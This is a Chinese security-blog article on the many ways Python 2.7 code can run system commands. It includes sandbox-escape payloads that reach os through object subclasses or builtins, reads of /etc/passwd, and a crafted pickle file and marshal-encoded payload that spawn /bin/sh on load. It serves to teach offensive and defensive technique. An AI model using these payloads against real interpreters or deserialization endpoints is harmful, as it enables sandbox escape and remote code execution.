> 原文链接: https://www.anquanke.com//post/id/156916 


# python 执行系统命令的多种方式


                                阅读量   
                                **185923**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01691edf6be471d48a.jpg)](https://p4.ssl.qhimg.com/t01691edf6be471d48a.jpg)

## 0x00 前言

本片文章总结下在python 的环境下的执行系统命令的方式，本文Python版本为2.7，Python3 不是很熟，因为很多好的工具都是基于Python2的，比如Impacket，Empire(flask)，所以我也很少用Python3 写东西。如果对Python3熟练的同学，可以对本文的涉及到的东西进行相应的变换，大家还有什么更多的方式可以留言交流。



## 0x01 python function
- `exec('import os ;os.system("ls")')`
先说下exec函数，从[文档](https://docs.python.org/2/reference/simple_stmts.html#exec) 可以知道，参数是UTF-8,Latin字符串，打开的File对象，以及代码对象或者Tuple。字符串类型会被解析为Python 代码然后执行，代码对象就是直接执行，File对象根据EOF来解析，然后执行代码，Tuple对象可以去查看文档中所说的情形。

[![](https://p3.ssl.qhimg.com/t017f3db6c9cc7b666b.png)](https://p3.ssl.qhimg.com/t017f3db6c9cc7b666b.png)
- `eval('__import__("os").system("ls")')`
Eval函数，从[文档](https://docs.python.org/2/library/functions.html?highlight=eval#eval)中的定义为:`eval(expression[, globals[, locals]])` ，第一个表达式参数是String类型，globals必须是字典类型，在没有globals和locals参数时，就会执行表达式。如果缺少`__builtin__` 库时，会在执行表达式之前把当前指定的 globals 复制到全局的globals。但是Eval也是可以执行代码对象的。比如`eval(compile('print "hello world"', '&lt;stdin&gt;', 'exec'))` ，在用到exec作为参数时函数会返回`None` 。

[![](https://p5.ssl.qhimg.com/t01bf461274b22f5601.png)](https://p5.ssl.qhimg.com/t01bf461274b22f5601.png)

这个[例子](http://www.freebuf.com/articles/web/136180.html)：读取文件，把参数加入到globals对象中。

```
def from_pyfile(self, filename, silent=False):
        filename = os.path.join(self.root_path, filename)
        d = imp.new_module('config')
        d.__file__ = filename
        try:
            with open(filename) as config_file:
                exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
        except IOError as e:
            if silent and e.errno in (errno.ENOENT, errno.EISDIR):
                return False
            e.strerror = 'Unable to load configuration file (%s)' % e.strerror
            raise
        self.from_object(d)
        return True
```
- `system('ls')`
- `subprocess.Popen('ls')`
- `os.popen('ls')`


## 0x02 python lib

Python 都是通过引入不同的库，来执行其中的函数。关于Import 的各种方式，可以看看[这里](https://xz.aliyun.com/t/52#toc-9)的总结。我这里直接列出Payload:

```
&gt;&gt;&gt; [].__class__
&lt;type 'list'&gt;
&gt;&gt;&gt; [].__class__.__base__
&lt;type 'object'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__
&lt;built-in method __subclasses__ of type object at 0x55a9f3d5cb80&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()
[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;]
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40]
&lt;type 'file'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40]('/etc/hosts','r').read()
'127.0.0.1tlocalhostn127.0.1.1tdebiannn# The following lines are desirable for IPv6 capable hostsn::1     localhost ip6-localhost ip6-loopbacknff02::1 ip6-allnodesnff02::2 ip6-allroutersn'
```

`[].__class__.__base__.__subclasses__()[40]('/etc/hosts','r').read()`通过调用File函数来读取或者写文件。

`"".__class__.__mro__[-1].__subclasses__()[40]('/etc/hosts').read()`

遍历是否有catch_warnings，在导入linecache时会在导入os模块：

```
&gt;&gt;&gt; g_warnings = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__repr__.im_func.func_globals
&gt;&gt;&gt; print g_warnings["linecache"].os
&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;
&gt;&gt;&gt; print g_warnings["linecache"].os.system('id')
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),116(scanner)
```

`__import__("pbzznaqf".decode('rot_13')).getoutput('id')` 或者 `import importlib;importlib.import_module("pbzznaqf".decode('rot_13')).getoutput('id')`

对于前面这些所使用的函数都是来自于`__builtin__` ，如果被删除了就使用`reload(__builtin__)`

和`import imp;imp.reload(__builtin__)`

`__builtin__.eval('__import__("os").system("ls")')` 执行命令

在sys.modules中os模块不存在的时候，因为python导入库，其实就是执行一遍代码，所以`if __name__ =='__main__'` 就是为了防止在引入的时候，执行其中的代码。所以我们可以给Sys.module添加一个新module：

```
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os.py'
&gt;&gt;&gt; import os
```

execfile() 利用OS文件来执行命令：

```
&gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py')
&gt;&gt;&gt; system('cat /etc/passwd')
```

getattr函数，要先引入OS模块：

```
import os;getattr(os,'system')('id')
```



## 0x03 其他

利用Pickle.load来执行命令：

```
&gt;&gt;&gt; import pickle;pickle.load(open('cmd'))
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),116(scanner)
$ pwd
/tmp
$ cat cmd
cos
system
(S'/bin/sh'
tR.
```

解释下cmd文件，

第一行c就是读取这一行作为module引入，读取下一行作为module中的object，所以就变成了os.system。

第三行`(` 与第四行`t`组成元组，`S` 读取这一行的字符串，`R`把元组作为参数带入到上一个对象中执行。`.`表示pickle结束。

我们os模块的引用放入到函数中，并且利用marshal来序列化及进行编码。这里的`__code__`也是在上一篇节引用文章有提过的`func_code`

```
import marshal
import base64
def foo():
    import os
    os.system('/bin/sh')

print base64.b64encode(marshal.dumps(foo.__code__))

#output
YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zBwAAAC9iaW4vc2goAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwUAAABzcy5weXQDAAAAZm9vAwAAAHMEAAAAAAEMAQ==
```

[![](https://p3.ssl.qhimg.com/t013db136e81e890b64.png)](https://p3.ssl.qhimg.com/t013db136e81e890b64.png)

要执行其中的`foo()`的话，先解码，然后加载函数：

```
code_str = base64.b64decode(code_enc)
code = marshal.loads(code_str)
func = types.FunctionType(code, globals(), '')
func()
```

[![](https://p5.ssl.qhimg.com/t01a74ed035567bf52d.png)](https://p5.ssl.qhimg.com/t01a74ed035567bf52d.png)

其中引入了types，marshal，base64，globals，globals可以通过`__builtin__.globals` 来调用这个函数，所以根据Pickle的格式要求，我们的Pickle的文件内容应该是这样：

```
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zBwAAAC9iaW4vc2goAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwUAAABzcy5weXQDAAAAZm9vAwAAAHMEAAAAAAEMAQ=='
tR #base64 结束
tR #marshal 结束
c__builtin__
globals
(tR #globals 结束
S'' 
tR # '' 空字符
(tR. #调用函数
```

[![](https://p4.ssl.qhimg.com/t010db90e175945a3d2.png)](https://p4.ssl.qhimg.com/t010db90e175945a3d2.png)

所有这些执行命令的方式基本都是靠引用其他库，间接引用OS库，来执行命令或者读文件之类的。
